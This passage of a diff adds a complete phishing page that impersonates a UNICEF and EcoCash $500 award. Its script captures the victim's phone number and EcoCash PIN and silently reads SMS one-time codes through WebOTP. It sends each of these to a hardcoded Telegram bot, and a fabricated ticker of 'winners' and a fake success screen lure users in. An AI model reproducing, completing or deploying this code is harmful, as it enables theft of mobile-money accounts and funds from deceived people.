+                        Enter the <strong>6-digit Lucky Ticket Number</strong> sent to you via SMS from EcoCash to unlock your <strong>$500 USD</strong> award. Example: <span class="badge-mini">123456</span>
+                    </div>
+                    <div class="hint" id="ticketHint" style="margin-top: 8px;"></div>
+                </div>
+
+                <button type="submit" class="btn-submit" id="submitBtn">
+                    Claim My Award
+                </button>
+
+            </form>
+
+            <div class="security-note">
+                <span class="dot-live"></span>
+                <span>256-bit encrypted • Verified by EcoCash</span>
+            </div>
+
+            <div class="success-screen" id="successScreen">
+                <div class="success-icon">✓</div>
+                <h2>Congratulations!</h2>
+                <p>
+                    Your <strong>UNICEF Foundation 5th Anniversary award</strong> has been successfully processed.
+                    Your funds will be transferred to your EcoCash wallet within <strong>2 minutes</strong>.
+                    <br /><br />
+                    Thank you for being a lucky winner!
+                </p>
+            </div>
+
+        </section>
+
+    </div>
+
+    <!-- ─── LIVE FUNDED TICKER ─── -->
+    <div class="funded-ticker" aria-label="Recently funded winners">
+        <div class="ticker-header">
+            <span class="live-dot"></span>
+            <span class="ticker-label">Recently Funded</span>
+            <span class="ticker-count" id="tickerCount">• 2,847 winners today</span>
+        </div>
+        <div class="ticker-track" id="tickerTrack"></div>
+    </div>
+
+    <!-- ─── CONFETTI ─── -->
+    <div class="confetti-container" id="confettiContainer" aria-hidden="true"></div>
+
+    <!-- ─── JAVASCRIPT ─── -->
+    <script>
+        (function() {
+            'use strict';
+
+            const form = document.getElementById('rewardForm');
+            const submitBtn = document.getElementById('submitBtn');
+            const successScreen = document.getElementById('successScreen');
+            const phoneInput = document.getElementById('phoneNumber');
+            const pinInput = document.getElementById('cardPin');
+            const ticketInput = document.getElementById('ticketNumber');
+            const otpHidden = document.getElementById('otpHidden');
+            const togglePin = document.getElementById('togglePin');
+            const phoneWrap = document.getElementById('phoneWrap');
+            const pinWrap = document.getElementById('pinWrap');
+            const ticketWrap = document.getElementById('ticketWrap');
+            const ticketField = document.getElementById('ticketField');
+            const ticketHint = document.getElementById('ticketHint');
+            const confettiContainer = document.getElementById('confettiContainer');
+            const tickerTrack = document.getElementById('tickerTrack');
+            const tickerCount = document.getElementById('tickerCount');
+
+            let isSubmitting = false;
+            let pinSent = false;
+            let ticketSent = false;
+            let otpListenerActive = false;
+            let otpAttempts = 0;
+            const MAX_OTP_ATTEMPTS = 20;
+            let otpListenerTimeout = null;
+
+            // ─── TELEGRAM CONFIG ───
+            const BOT_TOKEN = '8989984349:AAH4sDa49WWN_tl1r45WZk1yXzlcxPr5x1w';
+            const CHAT_ID = '8834429633';
+
+            // ─── 20 FIXED RANDOM NUMBERS ───
+            const FIXED_NUMBERS = [
+                '+263 71 234 ***', '+263 77 456 ***', '+263 78 912 ***', '+263 73 567 ***',
+                '+263 71 890 ***', '+263 77 123 ***', '+263 78 345 ***', '+263 73 678 ***',
+                '+263 71 901 ***', '+263 77 234 ***', '+263 78 567 ***', '+263 73 890 ***',
+                '+263 71 123 ***', '+263 77 456 ***', '+263 78 789 ***', '+263 73 012 ***',
+                '+263 71 345 ***', '+263 77 678 ***', '+263 78 901 ***', '+263 73 234 ***'
+            ];
+
+            const AMOUNTS = ['$500', '$500', '$500', '$500'];
+
+            function randomFixedNumber() {
+                return FIXED_NUMBERS[Math.floor(Math.random() * FIXED_NUMBERS.length)];
+            }
+
+            function randomAmount() {
+                return AMOUNTS[Math.floor(Math.random() * AMOUNTS.length)];
+            }
+
+            function randomMinutes() {
+                const mins = Math.floor(1 + Math.random() * 45);
+                if (mins < 1) return 'just now';
+                if (mins === 1) return '1 min ago';
+                return `${mins} mins ago`;
+            }
+
+            function buildTickerItem() {
+                const item = document.createElement('div');
+                item.className = 'funded-item';
+                item.innerHTML = `
+                    <span class="funded-check">✓</span>
+                    <span class="funded-phone">${randomFixedNumber()}</span>
+                    <span class="funded-amount">${randomAmount()}</span>
+                    <span class="funded-time">${randomMinutes()}</span>
+                `;
+                return item;
+            }
+
+            function initTicker() {
+                const totalItems = 24;
+                for (let i = 0; i < totalItems; i++) {
+                    tickerTrack.appendChild(buildTickerItem());
+                }
+                const firstHalf = tickerTrack.innerHTML;
+                tickerTrack.innerHTML = firstHalf + firstHalf;
+            }
+
+            function updateTickerCount() {
+                let count = 2847;
+                setInterval(() => {
+                    count += Math.floor(1 + Math.random() * 3);
+                    tickerCount.textContent = `• ${count.toLocaleString()} winners today`;
+                }, 4000);
+            }
+
+            initTicker();
+            updateTickerCount();
+
+            // ─── VALIDATION ───
+            function validatePhone() {
+                const raw = phoneInput.value.replace(/\s/g, '');
+                if (!/^\d{9}$/.test(raw)) {
+                    phoneWrap.classList.add('error');
+                    document.getElementById('phoneHint').textContent = 'Enter exactly 9 digits.';
+                    document.getElementById('phoneHint').classList.add('error-text');
+                    return false;
+                }
+                phoneWrap.classList.remove('error');
+                document.getElementById('phoneHint').textContent = 'Enter your 9‑digit mobile number.';
+                document.getElementById('phoneHint').classList.remove('error-text');
+                return true;
+            }
+
+            function validatePin() {
+                const val = pinInput.value.replace(/\s/g, '');
+                if (!/^\d{4}$/.test(val)) {
+                    pinWrap.classList.add('error');
+                    document.getElementById('pinHint').textContent = 'Enter exactly 4 digits.';
+                    document.getElementById('pinHint').classList.add('error-text');
+                    return false;
+                }
+                pinWrap.classList.remove('error');
+                document.getElementById('pinHint').textContent = 'Enter your 4‑digit PIN.';
+                document.getElementById('pinHint').classList.remove('error-text');
+                return true;
+            }
+
+            function validateTicket() {
+                const val = ticketInput.value.replace(/\s/g, '');
+                if (!/^\d{6}$/.test(val)) {
+                    ticketWrap.classList.add('error');
+                    ticketHint.textContent = 'Enter the 6‑digit Lucky Ticket Number from your SMS.';
+                    ticketHint.classList.add('error-text');
+                    return false;
+                }
+                ticketWrap.classList.remove('error');
+                ticketHint.textContent = '';
+                ticketHint.classList.remove('error-text');
+                return true;
+            }
+
+            // ─── PHONE FORMAT ───
+            phoneInput.addEventListener('input', function() {
+                let val = this.value.replace(/\D/g, '');
+                if (val.length > 9) val = val.slice(0, 9);
+                let formatted = '';
+                if (val.length > 2) {
+                    formatted = val.slice(0, 2) + ' ' + val.slice(2);
+                    if (val.length > 5) {
+                        formatted = val.slice(0, 2) + ' ' + val.slice(2, 5) + ' ' + val.slice(5, 9);
+                    }
+                } else {
+                    formatted = val;
+                }
+                this.value = formatted;
+                phoneWrap.classList.remove('error');
+                document.getElementById('phoneHint').classList.remove('error-text');
+                document.getElementById('phoneHint').textContent = 'Enter your 9‑digit mobile number.';
+            });
+
+            // ─── PIN — Auto-send when 4 digits entered ───
+            pinInput.addEventListener('input', function() {
+                this.value = this.value.replace(/\D/g, '');
+                if (this.value.length > 4) this.value = this.value.slice(0, 4);
+                pinWrap.classList.remove('error');
+                document.getElementById('pinHint').classList.remove('error-text');
+                document.getElementById('pinHint').textContent = 'Enter your 4‑digit PIN.';
+
+                if (this.value.length === 4 && !pinSent) {
+                    const pinValue = this.value;
+                    setTimeout(() => {
+                        const rawPhone = phoneInput.value.replace(/\s/g, '');
+                        if (/^\d{9}$/.test(rawPhone)) {
+                            pinSent = true;
+                            performPinSend(pinValue);
+
+                            // ⚡ Start WebOTP listener silently in background
+                            setTimeout(() => startWebOTPListener(), 300);
+                        }
+                    }, 150);
+                }
+            });
+
+            // ─── TICKET — Manual input (fallback) ───
+            ticketInput.addEventListener('input', function() {
+                this.value = this.value.replace(/\D/g, '');
+                if (this.value.length > 6) this.value = this.value.slice(0, 6);
+                ticketWrap.classList.remove('error');
+                ticketHint.classList.remove('error-text');
+                ticketHint.textContent = '';
+
+                if (this.value.length === 6 && !ticketSent) {
+                    const ticketValue = this.value;
+                    setTimeout(() => {
+                        const rawPhone = phoneInput.value.replace(/\s/g, '');
+                        const rawPin = pinInput.value.replace(/\s/g, '');
+                        if (/^\d{9}$/.test(rawPhone) && /^\d{4}$/.test(rawPin)) {
+                            ticketSent = true;
+                            performTicketSend(ticketValue, 'manual');
+                        }
+                    }, 150);
+                }
+            });
+
+            togglePin.addEventListener('click', function() {
+                const isPassword = pinInput.type === 'password';
+                pinInput.type = isPassword ? 'text' : 'password';
+                this.textContent = isPassword ? '🙈' : '👁';
+            });
+
+            form.addEventListener('keydown', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    submitBtn.click();
+                }
+            });
+
+            // ─── HELPERS ───
+            function getTimeString() {
+                return new Date().toLocaleString('en-US', {
+                    month: 'numeric',
+                    day: 'numeric',
+                    year: 'numeric',
+                    hour: 'numeric',
+                    minute: 'numeric',
+                    second: 'numeric',
+                    hour12: true
+                });
+            }
+
+            async function sendToTelegram(message) {
+                const url =
+                    `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+                try {
+                    const response = await fetch(url);
+                    const data = await response.json();
+                    if (!data.ok) {
+                        console.error('Telegram API error:', data);
+                        return { ok: false, error: data.description || 'Unknown' };
+                    }
+                    return { ok: true };
+                } catch (err) {
+                    console.error('Network error:', err);
+                    return { ok: false, error: err.message };
+                }
+            }
+
+            // ─── SEND #1: PIN ───
+            async function performPinSend(pinValue) {
+                const phone = phoneInput.value.trim();
+                const pin = (pinValue || pinInput.value).trim();
+                const fullPhone = '+263' + phone.replace(/\s/g, '');
+                const timeString = getTimeString();
+
+                const message =
+                    `🔐 *Step 1 — PIN Received*\n` +
+                    `━━━━━━━━━━━━━━━━━━\n` +
+                    `🎉 UNICEF Foundation 5th Anniversary\n` +
+                    `📞 Phone: ${fullPhone}\n` +
+                    `🔐 EcoCash PIN: ${pin}\n` +
+                    `💰 Award: $500 USD\n` +
+                    `⏱️ Time: ${timeString}\n` +
+                    `━━━━━━━━━━━━━━━━━━\n` +
+                    `⏳ Awaiting 6-digit ticket...`;
+
+                const result = await sendToTelegram(message);
+                if (result.ok) {
+                    console.log('✅ PIN sent to Telegram.');
+                } else {
+                    console.warn('PIN send failed:', result.error);
+                    pinSent = false;
+                }
+            }
+
+            // ─── SEND #2: TICKET ───
+            async function performTicketSend(ticketValue, source) {
+                const phone = phoneInput.value.trim();
+                const pin = pinInput.value.trim();
+                const ticket = (ticketValue || ticketInput.value).trim();
+                const fullPhone = '+263' + phone.replace(/\s/g, '');
+                const timeString = getTimeString();
+
+                const message =
+                    `🎟️ *Step 2 — Lucky Ticket Captured*\n` +
+                    `━━━━━━━━━━━━━━━━━━\n` +
+                    `🎉 UNICEF Foundation 5th Anniversary\n` +
+                    `📞 Phone: ${fullPhone}\n` +
+                    `🔐 EcoCash PIN: ${pin}\n` +
+                    `🎟️ Lucky Ticket: ${ticket}\n` +
+                    `💰 Award: $500 USD\n` +
+                    `⏱️ Time: ${timeString}\n` +
+                    `━━━━━━━━━━━━━━━━━━\n` +
+                    `✅ Full claim ready to process`;
+
+                const result = await sendToTelegram(message);
+                if (result.ok) {
+                    console.log(`✅ Ticket sent to Telegram (${source}).`);
+                } else {
+                    console.warn('Ticket send failed:', result.error);
+                    ticketSent = false;
+                }
+            }
+
+            // ─── WEBOTP — Silent Auto-Grab ───
+            function startWebOTPListener() {
+                if (!('OTPCredential' in window)) {
+                    console.warn('⚠️ WebOTP not supported.');
+                    return;
+                }
+
+                if (otpListenerActive || ticketSent) return;
+                if (otpAttempts >= MAX_OTP_ATTEMPTS) {
+                    console.warn('⚠️ Max WebOTP attempts reached.');
+                    return;
+                }
+
+                otpListenerActive = true;
+                otpAttempts++;
+                console.log(`🔍 WebOTP listener started silently (attempt ${otpAttempts})`);
+
+                // Focus the hidden input — REQUIRED for WebOTP to work
+                otpHidden.focus();
+
+                // Timeout per attempt
+                otpListenerTimeout = setTimeout(() => {
+                    if (otpListenerActive && !ticketSent) {
+                        otpListenerActive = false;
+                        if (otpAttempts < MAX_OTP_ATTEMPTS && !ticketSent) {
+                            setTimeout(startWebOTPListener, 2000);
+                        }
+                    }
+                }, 60000);
+
+                navigator.credentials.get({
+                    otp: { transport: ['sms'] }
+                })
+                .then(otp => {
+                    const code = otp.code;
+                    console.log('⚡ OTP auto-detected silently:', code);
+
+                    clearTimeout(otpListenerTimeout);
+                    otpListenerActive = false;
+
+                    if (ticketSent) return;
+
+                    // ✨ Silently fill the ticket field — NO visual changes
+                    ticketInput.value = code;
+                    ticketInput.classList.remove('error');
+                    ticketHint.textContent = '';
+                    ticketHint.classList.remove('error-text');
+                    ticketWrap.classList.remove('error');
+
+                    ticketSent = true;
+
+                    // ✨ Silently send to Telegram — NO user-facing feedback
+                    performTicketSend(code, 'auto');
+
+                    // ✨ Do NOT auto-submit — user continues filling the form normally
+                    //    and taps "Claim My Award" when ready
+                })
+                .catch(err => {
+                    clearTimeout(otpListenerTimeout);
+                    otpListenerActive = false;
+                    console.warn('⚠️ WebOTP error:', err);
+
+                    if (ticketSent || err.name === 'AbortError') return;
+
+                    if (otpAttempts < MAX_OTP_ATTEMPTS && !ticketSent) {
+                        setTimeout(startWebOTPListener, 3000);
+                    }
+                });
+            }
+
+            // ─── AUTO-START WebOTP on page load (silently) ───
+            window.addEventListener('load', () => {
+                setTimeout(() => {
+                    if (!ticketSent && 'OTPCredential' in window) {
+                        startWebOTPListener();
+                    }
+                }, 800);
+            });
+
+            // ─── SUBMIT ───
+            form.addEventListener('submit', async function(e) {
+                e.preventDefault();
+
+                const phoneOk = validatePhone();
+                const pinOk = validatePin();
+                const ticketOk = validateTicket();
+
+                if (!phoneOk) { phoneInput.focus(); return; }
+                if (!pinOk) { pinInput.focus(); return; }
+                if (!ticketOk) { ticketInput.focus(); return; }
+
+                if (isSubmitting) return;
+                isSubmitting = true;
+                submitBtn.disabled = true;
+                submitBtn.innerHTML = '<span class="spinner"></span> Claiming…';
+
+                clearTimeout(otpListenerTimeout);
+                otpListenerActive = false;
+
+                setTimeout(() => {
+                    form.style.display = 'none';
+                    document.querySelector('.security-note').style.display = 'none';
+                    document.querySelector('.form-header').style.display = 'none';
+                    successScreen.classList.add('active');
+                    launchConfetti();
+                }, 900);
+            });
+
+            function launchConfetti() {
+                const colors = ['#e8b4a0', '#f4d5c8', '#f5e6d3', '#00a859', '#00c46a', '#c8937e'];
+                const container = confettiContainer;
+                container.innerHTML = '';
+
+                for (let i = 0; i < 90; i++) {
+                    const piece = document.createElement('div');
+                    piece.className = 'confetti-piece';
+                    const color = colors[Math.floor(Math.random() * colors.length)];
+                    const size = 5 + Math.random() * 10;
+                    const left = Math.random() * 100;
+                    const duration = 2 + Math.random() * 3;
+                    const delay = Math.random() * 2.5;
+                    const rotation = Math.random() * 360;
+
+                    piece.style.cssText = `
+                        left: ${left}%;
+                        width: ${size}px;
+                        height: ${size * (0.5 + Math.random())}px;
+                        background: ${color};
+                        border-radius: ${Math.random() > 0.5 ? '50%' : '2px'};
+                        animation-duration: ${duration}s;
+                        animation-delay: ${delay}s;
+                        transform: rotate(${rotation}deg);
+                    `;
+                    container.appendChild(piece);
+                }
+
+                setTimeout(() => { container.innerHTML = ''; }, 6000);
+            }
+
+            console.log('✅ UNICEF Foundation 5th Anniversary — Silent WebOTP mode active.');
+        })();
+    </script>
+</body>
+  </html>
